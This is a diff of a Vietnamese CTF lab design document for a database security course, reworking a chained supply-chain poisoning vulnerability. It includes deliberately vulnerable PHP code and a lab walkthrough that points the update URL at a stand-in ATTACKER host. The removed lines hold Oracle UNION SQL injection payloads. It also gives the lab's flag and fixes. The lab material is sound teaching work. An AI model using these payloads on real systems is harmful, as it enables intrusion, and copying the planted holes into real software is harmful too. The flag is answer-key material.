@@ -108,16 +108,18 @@ Toàn bộ dự án hoạt động trong môi trường **lab học tập nội 
 ┌─────────────────────────────────────────────────────────┐
 │                  PHP 8.1 Backend                        │
 │  ┌──────────┐  ┌──────────┐  ┌───────────┐  ┌────────┐  │
-│  │config.php│  │search.php│  │transcript │  │secret_ │  │
-│  │(session) │  │(Vuln 1)  │  │.php(Vuln2)│  │check   │  │
-│  └──────────┘  └──────────┘  └───────────┘  │(Vuln 3)│  │
-│                                             └────────┘  │
+│  │config.php│  │search.php│  │store.php  │  │partner │  │
+│  │(session) │  │(Vuln 1)  │  │(Vuln 2) │    │_config │  │
+│  └──────────┘  └──────────┘  └───────────┘  │(V3A)   │  │
+│                      ┌───────────┐          └────────┘  │
+│                      │admin.php  │  (V3B update trigger)│
+│                      └───────────┘                      │
 └────────────────────────┬────────────────────────────────┘
                          │ OCI8 oci_connect()
                          ▼
 ┌─────────────────────────────────────────────────────────┐
 │           Oracle Instant Client (OCI8 Driver)           │
-│              TNS: localhost:1539/XEPDB1                     │
+│              TNS: localhost:1539/XEPDB1                 │
 └────────────────────────┬────────────────────────────────┘
                          │ Oracle Net Protocol
                          ▼
@@ -160,7 +162,8 @@ Hệ thống được thiết kế dựa trên việc xác định các tài s�
 **Điểm đặt lỗ hổng cố ý:**
 - `search.php`: Tham số `?q=` không được parameterize → SQLi
 - `store.php`: Lỗi logic mua hàng với số lượng âm → Business Logic Attack
-- `admin.php`: Tin tưởng URL cập nhật từ DB → Supply Chain Attack
+- `partner_config.php`: thiếu kiểm tra role nên user thường đổi được `update_url` → Broken Access Control
+- `admin.php?check_updates=1`: tin tưởng URL cập nhật từ DB và manifest không ký số → Supply Chain Attack
 
 ---
 
@@ -185,8 +188,8 @@ USERS ──────── STUDENTS ──── ENROLLMENTS ──── CO
 **ENROLLMENTS** – Đăng ký môn + điểm, có `transcript_ref` và `internal_note`  
 **AUDIT_LOGS** – Ghi log hành động, `metadata_note` chứa fragment mã hóa  
 **FLAGS** – Lưu flag part A (hex encoded), có decoy  
-**ADMIN_SECRETS** – Lưu secret thật + fake, target của Blind SQLi  
-**CONFIG_STORE** – Cấu hình hệ thống, chứa flag suffix (hex encoded)  
+**ADMIN_SECRETS** – Lưu secret thật + fake/decoy legacy  
+**CONFIG_STORE** – Cấu hình hệ thống, chứa `update_url`, `app_version` và marker cho Flag 1  
 **FAKE_FLAGS** – Bảng chứa fake flags để đánh lạc hướng  
 **SYSTEM_HINTS** – Gợi ý gián tiếp cho người khai thác  
 **FLAG_ARCHIVE** – Bảng decoy trông giống bảng flag nhưng chứa fake data  
@@ -201,7 +204,8 @@ USERS ──────── STUDENTS ──── ENROLLMENTS ──── CO
 | Flag 1 | B | AUDIT_LOGS.metadata_note | Reversed string trong JSON |
 | Flag 1 | C | CONFIG_STORE.config_value (key='sys_alpha_marker') | Base64 encoding |
 | Flag 2 | - | Trang store.php (Vật phẩm "Exam Leak 2024") | Logic Manipulation |
-| Flag 3 | - | Trang admin.php (manifest.json từ Partner Server) | Hex-encoded in JSON |
+| Flag 3 | A | Partner manifest `flag_part` | Nửa đầu hex |
+| Flag 3 | B | `admin.php` server-side constant `FLAG3_LOCAL_HEX_SUFFIX` | Nửa sau hex; chỉ ghép/decode khi update thành công |
 
 ---
 
@@ -373,159 +377,115 @@ if ($qty <= 0) {
 
 ---
 
-### 6.3 VULNERABILITY 3 – Supply Chain Poisoning (Partner Update)
+### 6.3 VULNERABILITY 3 – Supply Chain Poisoning via Broken Access Control
 
 **Mức độ lỗ hổng (phân loại DBS401):** Hard (Chained Attack)  
 **Mức độ tìm flag:** Very Hard  
-**Vị trí:** `admin.php`, chức năng Cập nhật hệ thống  
-**Loại tấn công:** Supply Chain Poisoning via Database Manipulation
+**Vị trí:** `search.php`, `partner_config.php`, `admin.php?check_updates=1`  
+**Loại tấn công:** SQLi-based Reconnaissance + Broken Access Control + Supply Chain Poisoning
 
 #### Mô tả lỗ hổng
 
-Hệ thống Admin Panel thực hiện kiểm tra cập nhật từ một URL đối tác được lưu trong bảng `CONFIG_STORE`. URL này có `is_public = 0` nên không lộ ra giao diện. Tuy nhiên, hacker có thể dùng SQL Injection từ lỗ hổng 1 để tìm thấy URL này và dùng quyền truy cập database để sửa đổi nó, chuyển hướng hệ thống tải dữ liệu từ máy chủ độc hại.
+Luồng update của hệ thống phụ thuộc vào URL đối tác được lưu trong bảng `CONFIG_STORE` với key `update_url`. Giá trị này không hiển thị trong Admin Panel vì `is_public=0`, nhưng người chơi có thể dùng SQL Injection ở `search.php` để phát hiện `update_url` và `app_version`.
+
+Sau đó, endpoint ẩn `partner_config.php` cho phép **bất kỳ user đã đăng nhập** cập nhật `CONFIG_STORE.update_url` mà không kiểm tra role admin. Khi admin gọi `admin.php?check_updates=1`, server fetch manifest từ URL đã bị đổi. Nếu manifest có `version` lớn hơn `APP_VERSION`, hệ thống lấy `flag_part`, ghép với suffix hardcoded server-side trong `admin.php`, decode hex và hiển thị Flag 3.
 
 #### Đoạn code bị lỗi
 
+`partner_config.php` chỉ kiểm tra đăng nhập, không kiểm tra quyền admin:
+
 ```php
-// VULNERABLE – Tin tưởng hoàn toàn vào giá trị lưu trong database
+if (empty($_SESSION['user_id'])) {
+    header('Location: ' . APP_BASE . '/login.php');
+    exit;
+}
+// Missing: if ($_SESSION['role'] !== 'admin') { ... }
+
+$sql = "UPDATE CONFIG_STORE
+        SET config_value = :url,
+            updated_at = SYSDATE
+        WHERE config_key = 'update_url'";
+```
+
+`admin.php` tin tưởng URL từ DB và manifest chưa có chữ ký:
+
+```php
 $q = oci_parse($conn, "SELECT config_value FROM CONFIG_STORE WHERE config_key = 'update_url'");
 oci_execute($q);
 $url = $conf['CONFIG_VALUE'] ?? DEFAULT_UPDATE_URL;
 $jsonData = @file_get_contents($url);
 ```
 
+Khi version hợp lệ, `admin.php` ghép mảnh hex từ manifest với suffix server-side:
+
+```php
+$manifestFlagPart = $manifest['flag_part'] ?? '';
+$flag3 = decodeHexFlagFragment($manifestFlagPart);
+```
+
 #### Nguyên nhân
 
-1. Không kiểm tra tính hợp lệ (Whitelisting) của URL đối tác.
-2. Thiếu cơ chế xác thực chữ ký số (Digital Signature) cho file manifest.json.
-3. Dữ liệu cấu hình nhạy cảm (`update_url`) có thể bị thay đổi trái phép qua lỗi SQL Injection (VULN 1).
+1. `partner_config.php` thiếu Broken Access Control: không kiểm tra `$_SESSION['role'] === 'admin'`.
+2. `admin.php` tin tưởng `update_url` từ database mà không whitelist domain/URL.
+3. Manifest JSON không có chữ ký số/HMAC nên attacker có thể giả mạo nội dung.
+4. Logic `version_compare()` bị lợi dụng bằng manifest có version cao bất thường như `9.9.9`.
 
 #### Tác động
 
-Kẻ tấn công có thể chiếm quyền điều khiển luồng cập nhật của quản trị viên, lừa hệ thống tải về và hiển thị các mảnh Flag bí mật hoặc thông tin độc hại từ máy chủ của hacker.
+User thường có thể đầu độc nguồn cập nhật của hệ thống. Khi admin trigger update, server kết nối tới manifest của attacker và hiển thị Flag 3. Trong hệ thống thật, pattern tương tự có thể dẫn tới SSRF, supply-chain poisoning, hoặc tải payload sai nguồn.
 
-#### Kịch bản khai thác (lab)
+#### Kịch bản khai thác lab
 
-1. Sử dụng lỗ hổng SQL Injection tại `search.php` để tìm giá trị `update_url` trong bảng `CONFIG_STORE` (is_public=0).
-2. Sử dụng quyền quản trị hoặc lỗ hổng tương đương để thực hiện `UPDATE` giá trị `update_url` trỏ về máy chủ của kẻ tấn công.
-3. Trên máy chủ kẻ tấn công, chuẩn bị file `manifest.json` với phiên bản cao hơn hiện tại (ví dụ: 4.0.0) và chứa mã Hex của Flag 3.
-4. Truy cập `admin.php`, nhấn "Check for Partner Updates".
-5. Hệ thống tải manifest độc hại, thông báo cập nhật thành công và hiển thị Flag 3.
-6. Giải mã chuỗi Hex thu được để có Flag hoàn chỉnh.
+1. Đăng nhập bằng `student1 / Student@123`.
+2. Dùng SQLi ở `search.php` để đọc `CONFIG_STORE.update_url` và `CONFIG_STORE.app_version`.
+3. Fuzz/tìm endpoint ẩn `partner_config.php`.
+4. Dùng quyền user thường POST `manifest_url=http://ATTACKER:8081/manifest.json` vào `partner_config.php`.
+5. Attacker phục vụ `manifest.json`:
 
-**Bổ sung hướng dẫn step – by – step quy trình 1 hacker khai thác vulnerabitly 3:**
-
-**Giai đoạn 1: Thăm dò và Phát hiện (Reconnaissance)**
-
-**1. Phát hiện tính năng:** Hacker truy cập admin.php và thấy nút **"Check for Partner Updates"**.
-
-* **Hành động:** Bật Burp Suite, nhấn nút.
-* **Kết quả:** Hệ thống báo *"System is up to date (Current: 3.1.0, Partner: 3.0.5)"*.
-* **Suy luận:** Có một cơ chế so sánh phiên bản. Flag có thể hiện ra nếu Partner Version > Current Version (đây là bước khó nhất vì phải có tư duy hệ thống).
-
-**2. Bắt gói tin (Interception):** Kiểm tra HTTP History trong Burp Suite.
-
-* Hacker thấy server gửi request đến http://127.0.0.1:8081/manifest.json.
-* **Suy luận:** Server lấy cấu hình từ một URL. URL này chắc chắn nằm trong Database.
-
-**Giai đoạn 2: Khai thác SQL Injection để lục tìm cấu hình (Database Enumeration)**
-
-Hacker quay lại search.php để tìm xem cái URL kia trốn ở đâu.
-
-**1. Xác định số lượng cột:**
-
-* **Câu lệnh:** ' UNION SELECT NULL, NULL, NULL FROM DUAL--
-* **Giải thích:** Hacker thử dùng NULL vì nó khớp với mọi kiểu dữ liệu. Khi nhập 3 NULL, trang web hiện ra 1 dòng trống => Xác nhận bảng gốc có **3 cột**.
-
-**2. Tìm tên bảng (Table Enumeration):**
-
-* **Câu lệnh:** ' UNION SELECT 1, table\_name, NULL FROM USER\_TABLES WHERE table\_name LIKE '%CONFIG%'--
-* **Giải thích:**
-* Sử dụng 1 (số) ở cột 1 vì cột gốc (student\_id) là kiểu NUMBER. Nếu dùng chữ sẽ lỗi.
-* Sử dụng table\_name ở cột 2 vì cột gốc (full\_name) là kiểu VARCHAR2.
-* Sử dụng NULL ở cột 3 cho rảnh tay.
-* LIKE '%CONFIG%': Tìm các bảng có tên liên quan đến cấu hình.
-* **Kết quả:** Tìm thấy bảng CONFIG\_STORE.
-
-**3. Tìm tên cột (Column Enumeration):**
-
-* **Câu lệnh:** ' UNION SELECT 1, column\_name, NULL FROM USER\_TAB\_COLUMNS WHERE table\_name='CONFIG\_STORE'--
-* **Kết quả:** Thấy các cột CONFIG\_KEY, CONFIG\_VALUE, IS\_PUBLIC.
-
-**4. Trích xuất URL mục tiêu:**
-
-* **Câu lệnh:** ' UNION SELECT 1, config\_key, config\_value FROM CONFIG\_STORE WHERE config\_key LIKE '%url%'--
-* **Kết quả:** update\_url = http://127.0.0.1:8081/manifest.json.
-
-**Giai đoạn 3: Đối đầu với "Bẫy" (Handling Fake Flags & Decoys)**
-
-Trong quá trình lục lọi, hacker sẽ gặp các thông tin giả:
-
-* **Bảng FLAG\_ARCHIVE:** Hacker có thể thấy bảng này và tưởng là nơi chứa flag thật. Nhưng khi SELECT, dữ liệu toàn là DBS401{FAKE\_...}.
-* **Bảng FAKE\_FLAGS:** Chứa hàng loạt flag giả để đánh lừa các script scan tự động.
-* **oracle\_flag\_3\_backup:** Trong bảng ADMIN\_SECRETS, hacker thấy khóa này nhưng is\_active = 0. Nếu mất thời gian giải mã Blind SQLi vào đây, họ sẽ chỉ nhận được flag giả.
-
-**Chiến thuật của Hacker:** Luôn bám sát luồng xử lý của tính năng (Update) thay vì đi lang thang tìm các bảng có chữ "Flag".
-
-**Giai đoạn 4: Phân tích Đối tác và Chuẩn bị Payload (The JSON Trap)**
-
-1. **Lấy Flag gốc:** Hacker truy cập trực tiếp http://127.0.0.1:8081/manifest.json.
-   * **Kết quả:** {"version":"3.0.5", "flag\_part":"44425334..."}.
-   * **Vấn đề:** Flag này đang bị "khóa" bởi logic 3.0.5 < 3.1.0.
-2. **Viết file JSON độc hại (evil.json):** Hacker tạo một file trên server của mình (hacker-server.io):
-
-json
-
+```json
 {
-
-"version": "9.9.9",
-
-"status": "critical",
-
-"flag\_part": "4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d"
-
+  "version": "9.9.9",
+  "status": "critical_update",
+  "checksum": "deadbeef1337",
+  "flag_part": "4442533430317b3575707031795f436834"
 }
+```
 
-  + **Tại sao có status?** Để giả dạng giống hệt file gốc, tránh bị admin nghi ngờ nếu họ xem log.
-  + **Tại sao 9.9.9?** Để chắc chắn vượt qua hàm version\_compare của hệ thống.
-  + **“flag\_part”:** Lấy từ phần flag\_part trả về khi truy cập trực tiếp vào manifest.json.
+6. Đăng nhập admin và gọi `admin.php?check_updates=1`.
+7. `admin.php` ghép `flag_part` với `FLAG3_LOCAL_HEX_SUFFIX`, decode hex và hiển thị:
 
-**Giai đoạn 5: Tấn công Supply Chain (Poisoning)**
-
-1. **Thực hiện lệnh UPDATE:** Hacker dùng SQL Injection để đổi URL tin cậy: UPDATE CONFIG\_STORE SET config\_value = 'http://hacker-server.io/evil.json' WHERE config\_key = 'update\_url' *(Trong thực tế Lab, bước này chứng minh hacker đã kiểm soát được cấu hình hệ thống).*
-2. **Kích hoạt hệ thống:** Admin (hoặc hacker) nhấn "Check for Partner Updates" trong admin.php.
-   * **Hệ thống:** "Ồ, có bản 9.9.9 mới từ đối tác (thực ra là hacker)!"
-   * **Hành động:** Hệ thống tải file JSON về, thấy version hợp lệ => Phun chuỗi flag\_part ra màn hình.
-
-**Giai đoạn 6: Capture & Decode**
-
-1. **Xác nhận:** Trên giao diện hiện ra mã Hex.
-2. **Giải mã:** Hacker dùng tool đổi Hex sang ASCII.
-   * 4442... => **DBS401{5upp1y\_Ch41n\_P0150n1ng\_0912}**
+```text
+DBS401{5upp1y_Ch41n_P0150n1ng_0912}
+```
 
 #### Vì sao flag Very Hard
 
-- Không có output trực tiếp → bắt buộc dùng boolean inference.
-- Cần hàng chục request để extract từng ký tự.
-- Tồn tại fake key (`oracle_flag_3_backup`) với is_active=1 → dễ nhầm lẫn.
-- Part B cần lấy từ CONFIG_STORE bằng kỹ thuật khác (Vuln 1 SQLi).
-- Part B được hex encoded → cần decode.
-- Cần phân biệt Part A thật vs Part A của fake key.
-Đây là một cuộc tấn công chuỗi (chained attack) đòi hỏi sự phối hợp giữa khả năng khai thác SQL Injection để thay đổi cấu hình hệ thống, kỹ thuật giả mạo dịch vụ đối tác (Supply Chain), và khả năng vượt qua cơ chế kiểm tra phiên bản phần mềm.
+- Người chơi phải dùng SQLi để hiểu cơ chế `update_url`/`app_version`, nhưng SQLi không trực tiếp đổi được DB vì OCI8 không hỗ trợ stacked query.
+- Endpoint đổi URL bị ẩn khỏi navbar, phải tìm bằng fuzz/recon.
+- Manifest không chứa full flag; chỉ chứa nửa đầu hex.
+- Nửa sau nằm server-side trong `admin.php` và chỉ được ghép/decode sau khi update thành công.
+- Có decoy như `oracle_flag_3_backup`, `FAKE_FLAGS`, `FLAG_ARCHIVE` khiến người chơi dễ đi sai hướng.
 
 #### Cách khắc phục
 
 ```php
-// Secure version – Whitelist URL cập nhật và xác thực nguồn
-$allowedUpdateUrls = [
-    'http://cdn.fpt-partner.net/v3/manifest.json',
-    'https://api.fpt-partner-cloud.net/v3/updates'
+// partner_config.php secure
+if ($_SESSION['role'] !== 'admin') {
+    http_response_code(403);
+    exit;
+}
+
+$allowedManifestUrls = [
+    'http://127.0.0.1:8081/manifest.json',
+    'https://cdn.fpt-partner.net/v3/manifest.json'
 ];
 
-if (!in_array($url, $allowedUpdateUrls)) {
-    die("Security Error: Unauthorized update source.");
+if (!in_array($manifestUrl, $allowedManifestUrls, true)) {
+    die('Blocked: manifest URL is not approved.');
 }
 ```
+
+Ngoài ra, `admin.php` cần whitelist URL trước khi fetch, chặn IP nội bộ/metadata trong môi trường cloud, đặt timeout ngắn, và verify chữ ký số/HMAC của manifest trước khi tin bất kỳ field nào.
 
 ---
 
@@ -535,7 +495,7 @@ if (!in_array($url, $allowedUpdateUrls)) {
 |---------|------|--------------------------|-----------------|
 | Vulnerability 1 | Oracle SQL Injection | **Easy** | **Very Hard** |
 | Vulnerability 2 | Insecure Business Logic | **Hard** | **Very Hard** |
-| Vulnerability 3 | Supply Chain Poisoning | **Hard** | **Very Hard** |
+| Vulnerability 3 | Broken Access Control + Supply Chain Poisoning | **Hard** | **Very Hard** |
 
 > **Ghi chú quan trọng:**  
 > Nhóm tuân thủ khuyến nghị Easy – Medium – Hard cho mức độ nhận diện và phân loại lỗ hổng theo yêu cầu môn DBS401. Tuy nhiên, để tăng tính thử thách CTF và khả năng phân tích database security thực tế, cả 3 flag đều được thiết kế ở mức **Very Hard**. Người kiểm thử không thể lấy flag bằng một request đơn giản mà phải kết hợp: recon, phân tích request/response, truy vấn Oracle metadata, loại bỏ dữ liệu giả (fake flags, decoy tables), decode (hex/base64/reverse), và ghép nhiều mảnh flag từ nhiều bảng khác nhau.
